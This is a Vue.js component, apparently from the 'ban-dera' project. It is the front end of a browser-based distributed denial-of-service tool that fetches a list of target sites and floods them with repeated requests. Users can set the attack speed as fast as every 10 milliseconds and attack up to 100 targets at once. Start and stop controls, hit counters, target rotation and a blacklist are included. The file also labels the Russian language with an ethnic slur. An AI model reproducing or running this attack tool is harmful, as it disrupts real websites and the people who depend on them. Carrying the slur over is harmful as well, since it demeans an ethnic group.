<template>
    <div class="container">
        <div class="d-flex justify-content-between mt-3">
            <div class="d-flex form-check form-switch justify-content-center">
                <label class="form-check-label">
                    <input class="form-check-input me-2" type="checkbox" v-model="nightMode">
                    {{ $t('night') }}
                </label>
            </div>
            <div class="dropdown">
                <a class="dropdown-toggle" href="#" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
                    {{ $t('locale') }}
                </a>

                <ul class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                    <li><a href="javascript:void(0);" @click="setLocale('uk')">Українська</a></li>
                    <li><a href="javascript:void(0);" @click="setLocale('en')">English</a></li>
                    <li><a href="javascript:void(0);" @click="setLocale('es')">Español</a></li>
                    <li><a href="javascript:void(0);" @click="setLocale('ru')">Кацапська</a></li>
                </ul>
            </div>
        </div>

        <div class="row text-center mt-3">
            <div>
                <img src="/img/ban-dera-logo.svg" alt="" style="max-width: 120px">
<!--                <svg xmlns="http://www.w3.org/2000/svg" width="120px" height="80px" class="m-auto">-->
<!--                    <rect width="120" height="80" fill="#005BBB"/>-->
<!--                    <rect width="120" height="40" y="40" fill="#FFD500"/>-->
<!--                </svg>-->
            </div>
            <h1>{{ $t('app.title') }}</h1>
            <p v-html="$t('app.subtitle')"></p>
            <p>{{ $t(('targets')) }}: {{ targets.length }}</p>
            <div class="d-flex justify-content-center gap-3 mt-3">
                <TargetListOffcanvas :targets="targets"/>
                <HelpArmyModal />
                <SupportProjectModal />
            </div>
            <div class="d-flex justify-content-center gap-3 mt-3">
                <InfoModal />
                <VPNServicesModal />
                <a href="https://t.me/ban_dera_com" target="_blank" class="btn btn-sm btn-secondary">
                    <i class="bi bi-telegram me-2"></i> Telegram
                </a>
                <a href="https://github.com/vnestoruk/ban-dera" target="_blank" class="btn btn-sm btn-secondary">
                    <i class="bi bi-github me-2"></i> GitHub
                </a>
            </div>
        </div>
        <hr>
        <h3 class="text-center">{{ $t('settings') }}</h3>
        <div class="d-flex align-items-end gap-3 mb-3">
            <div class="col flex-grow-1">
                <label class="form-label">{{ $t('attackSpeed.label') }}</label>
                <select v-model="interval" class="form-select form-select-sm bandera" :aria-label="$t('attackSpeed.label')">
                    <option value="1000">{{ $t('attackSpeed.options[0]') }}</option>
                    <option value="200">{{ $t('attackSpeed.options[1]') }}</option>
                    <option value="100">{{ $t('attackSpeed.options[2]') }}</option>
                    <option value="50">{{ $t('attackSpeed.options[3]') }}</option>
                    <option value="20">{{ $t('attackSpeed.options[4]') }}</option>
                    <option value="10">{{ $t('attackSpeed.options[5]') }}</option>
                </select>
            </div>
            <div class="col flex-grow-1">
                <label class="form-label">{{ $t('maxTargets.label') }}</label>
                <select v-model="maxTargets" class="form-select form-select-sm bandera" :aria-label="$t('maxTargets.label')">
                    <option value="1">{{ $t('maxTargets.options[0]') }}</option>
                    <option value="5">{{ $t('maxTargets.options[1]') }}</option>
                    <option value="10">{{ $t('maxTargets.options[2]') }}</option>
                    <option value="20">{{ $t('maxTargets.options[3]') }}</option>
                    <option value="30">{{ $t('maxTargets.options[4]') }}</option>
                    <option value="50">{{ $t('maxTargets.options[5]') }}</option>
                    <option value="75">{{ $t('maxTargets.options[6]') }}</option>
                    <option value="100">{{ $t('maxTargets.options[7]') }}</option>
                </select>
            </div>
            <button class="btn btn-sm btn-success" @click="start">
                <i class="bi bi-play-circle me-2"></i>Start
            </button>
            <button class="btn btn-sm btn-danger" @click="stop">
                <i class="bi bi-stop-circle me-2"></i>Stop
            </button>
        </div>
        <hr>
        <!-- Main screen -->
        <div class="row table-container mt-3 mb-5">
            <table>
                <thead>
                <tr>
                    <td>{{ $t('table.url') }}</td>
                    <td class="text-end pe-3">{{ $t('table.requests') }}</td>
                    <td class="text-end">{{ $t('table.actions') }}</td>
                </tr>
                </thead>
                <tbody id="bandera">
                <tr v-for="(b, index) in queue" :key="index">
                    <td :class="{ 'text-warning' : b.requests.strike > 50, 'text-danger': b.requests.strike > 100 }">{{ b.target.url }}</td>
                    <td class="text-end pe-3">
                        <span class="d-none d-md-inline"><i class="bi bi-check-circle me-2 text-success"></i>{{ b.requests.success }} /</span>
                        <span class="d-none d-md-inline"><i class="bi bi-x-circle me-2 text-danger"></i>{{ b.requests.failed }} /</span>
                        <span class=""><i class="bi bi-exclamation-circle me-2 text-primary"></i>{{ b.requests.total }}</span></td>
                    <td class="text-end">
                        <a :href="b.target.url" target="_blank" class="text-primary me-2" :title="$t('open')"><i class="bi bi-box-arrow-up-right"></i></a>
                        <a href="javascript:void(0)" @click="replaceTarget(b)" class="text-warning me-2" :title="$t('replace')"><i class="bi bi-shuffle"></i></a>
                        <a href="javascript:void(0)" @click="addToBlackList(b)" class="text-danger me-2" :title="$t('blackList')"><i class="bi bi-x-octagon"></i></a>
                    </td>
                </tr>
                </tbody>
            </table>
        </div>
        <!-- End main screen -->
        <hr>
        <div class="text-center mb-3">
            <p>{{ $t('share.timer', { darknessPeriod }) }}</p>
            <a href="javascript:void(0)" data-bs-toggle="modal" data-bs-target="#stopPutinModal">{{ $t('share.stop') }}</a>
            <div class="modal fade" id="stopPutinModal" tabindex="-1" aria-labelledby="stopPutinModalLabel" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content text-start">
                        <div class="modal-header">
                            <h5 class="modal-title" id="stopPutinModalLabel">{{ $t('share.title') }}</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body text-center">
                            <CopyToClipboard>
                                <p class="h2">https://ban-dera.com</p>
                            </CopyToClipboard>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
import Bandera from "../modules/bandera";
import request from "../modules/request";
import TargetListOffcanvas from "./offcanvas/TargetListOffcanvas";
import HelpArmyModal from "./modal/HelpArmyModal";
import SupportProjectModal from "./modal/SupportProjectModal";
import InfoModal from "./modal/InfoModal";
import CopyToClipboard from "./elements/CopyToClipboard";
import VPNServicesModal from "./modal/VPNServicesModal";

export default {
    name: "Bandera",
    components: {VPNServicesModal, CopyToClipboard, InfoModal, SupportProjectModal, HelpArmyModal, TargetListOffcanvas},
    data() {
        return {
            timer: null,
            interval: 100,
            targets: [],
            blackList: [],
            queue: [],
            nightMode: false,
            maxTargets: 10
        }
    },
    computed: {
        darknessPeriod() {
            let badDay = new Date('07-10-1952');
            return ((new Date() - badDay) / (1000*60*60*24)).toFixed(0);
        }
    },
    watch: {
        nightMode(newVal) {
            document.body.setAttribute('data-theme', (newVal) ? 'night' : 'light');
        },
        interval() {
            this.start();
        },
        maxTargets(newVal, oldVal) {
            this.stop();
            this.start();
        }
    },
    mounted() {
        this.nightMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
        // Get all the targets
        request({
            method: 'GET',
            url: '/api/targets'
        }).then(
            (response) => {
                this.targets = response.data;
                this.start();
            }
        );

        PayPal.Donation.Button({
            env:'production',
            hosted_button_id:'8KSAFMDP25PY4',
            image: {
                src:'https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif',
                alt:'Donate with PayPal button',
                title:'PayPal - The safer, easier way to pay online!',
            }
        }).render('#donate-button');
    },
    methods: {
        start() {
            if (this.queue.length === 0) this.getRandomTargets(this.maxTargets);
            clearInterval(this.timer);
            this.timer = setInterval(() => {
                console.clear();
                this.queue.filter(i => {
                    if (i.requests.strike > 150) return this.replaceTarget(i);
                    i.run();
                });

            }, this.interval);
        },
        stop() {
            clearInterval(this.timer);
            this.queue = [];
        },
        // recursively getting random targets
        getRandomTargets(count, targets = [], excludeId = null) {
            if (count === 0) return targets.filter(target => {
                this.queue.push(new Bandera(target));
            });

            let source = this.targets;
            let selectedTarget = source.sort(() => 0.5 - Math.random()).slice(0, 1)[0];
            if (
                (typeof targets.find(item => item.id === selectedTarget.id) === 'undefined') ||
                (typeof this.blackList.find(item => item.id === selectedTarget.id) === 'undefined') ||
                (typeof this.queue.find(item => item.target.id === selectedTarget.id) === 'undefined') ||
                (excludeId !== null && excludeId === selectedTarget.id)
            ) {
                targets.push(selectedTarget);
                this.getRandomTargets(--count, targets, excludeId);
            } else {
                this.getRandomTargets(count, targets, excludeId);
            }
        },
        async replaceTarget(obj) {
            this.queue.splice(this.queue.findIndex(item => item.target.id === obj.target.id), 1);
            this.getRandomTargets(1, [], obj.target.id);
        },
        addToBlackList(obj) {
            this.blackList.push(obj);
            this.replaceTarget(obj);
        },
        setLocale(locale) {
            this.$root.$i18n.locale = locale;
        }
    }
}
</script>

<style scoped>

</style>
